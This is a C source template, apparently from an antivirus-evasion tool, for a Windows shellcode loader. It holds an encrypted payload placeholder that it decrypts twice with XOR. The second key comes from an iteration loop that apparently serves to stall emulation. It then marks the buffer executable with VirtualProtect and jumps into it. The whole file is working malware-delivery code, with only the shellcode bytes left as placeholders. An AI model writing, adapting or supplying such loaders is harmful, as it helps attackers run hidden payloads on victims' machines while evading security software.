#include <windows.h>
#include <stdio.h>

unsigned char payload[] = "[[SHELLCODE_PAYLOAD]]";
int payload_length = [[SHELLCODE_PAYLOAD_LENGTH]];


void xor_buffer_with_key(char *buffer, int buffer_length, char *key, int key_length) {
    for (int i = 0; i < buffer_length; i++) {
        buffer[i] = buffer[i] ^ key[i % key_length];
    }
} 

void compute(int iterations, unsigned char* u, int size) {
	for(int i = 0; i < iterations; i++) {
        int a = (i+2) % size;
        int b = (i+1) % size;
        int c = i % size;
		u[a] = (u[b] + u[c] + i) % 255; 
	} 
}


int main(void) {
    DWORD ignore;
    
    unsigned char payload_static_key[] = "[[PAYLOAD_STATIC_KEY]]";
    xor_buffer_with_key(payload, payload_length, payload_static_key, [[PAYLOAD_STATIC_KEY_LENGTH]]);

    unsigned char payload_key[[[PAYLOAD_KEY_LENGTH]]] = {0};
    payload_key[0] = 0;
    payload_key[1] = 1;

    compute([[PAYLOAD_ITER_NUMBER]], payload_key, [[PAYLOAD_KEY_LENGTH]]);

    xor_buffer_with_key(payload, payload_length, payload_key, [[PAYLOAD_KEY_LENGTH]]);
    
    // make the shellcode executable
    VirtualProtect(payload, payload_length, PAGE_EXECUTE, &ignore);
    // cast the shellcode to a function pointer
    int (*payload_func)() = (int (*)()) payload;

    // execute the function
    payload_func();

    return 0;
}